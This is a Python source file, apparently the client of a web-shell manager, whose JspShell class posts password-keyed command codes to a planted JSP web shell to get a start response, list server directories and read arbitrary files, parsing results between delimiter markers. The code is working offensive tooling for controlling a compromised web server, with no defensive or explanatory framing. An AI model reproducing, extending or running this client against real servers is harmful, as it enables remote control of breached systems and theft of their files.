# coding=utf-8

"""
@version: 1.0
@author: chaowei
@file: shell.py
@time: 2018/2/18 16:52
"""
import requests
import config

import sys

sys.path.append("..")

from entity import *
from dbHelper import DatabaseHelper

class ShellTools:

    def __init__(self):
        pass

    @staticmethod
    def getShellTools(shellEntity):
        if shellEntity.shell_script_type=='JSP':
            return JspShell(shellEntity)

class JspShell:

    def __init__(self,shellEntity):
        self.shellEntity=shellEntity
        self.httpSettingEntity=DatabaseHelper.getHttpSettingEntityByShellID(shellEntity.shell_id)
        if not self.httpSettingEntity:
            self.httpSettingEntity=HttpSettingEntity(config.HTTP_DEFAULT_COOKIE,config.HTTP_DEFAULT_UA)
        self.httpHeaders={'User-Agent': self.httpSettingEntity.user_agent,'Cookie':self.httpSettingEntity.cookie}

    def parseResponse(self,response):
        if config.SPLIT_SYMBOL_LEFT in response and config.SPLIT_SYMBOL_RIGHT in response:
            return response[response.find(config.SPLIT_SYMBOL_LEFT)+len(config.SPLIT_SYMBOL_LEFT):response.find(config.SPLIT_SYMBOL_RIGHT)]
        else:
            return 'Error://no symbol'

    def getStart(self):
        payload = {self.shellEntity.shell_password: 'A','z0':self.shellEntity.shell_encode_type}
        r=requests.post(self.shellEntity.shell_address,headers=self.httpHeaders,data=payload)
        return self.parseResponse(r.text)

    def getDirectoryContent(self,path):
        payload = {self.shellEntity.shell_password: 'B','z1':path,'z0':self.shellEntity.shell_encode_type}
        r = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
        return self.parseResponse(r.text)

    def getFileContent(self,path):
        payload = {self.shellEntity.shell_password: 'C', 'z1': path,'z0':self.shellEntity.shell_encode_type}
        r = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
        return self.parseResponse(r.text)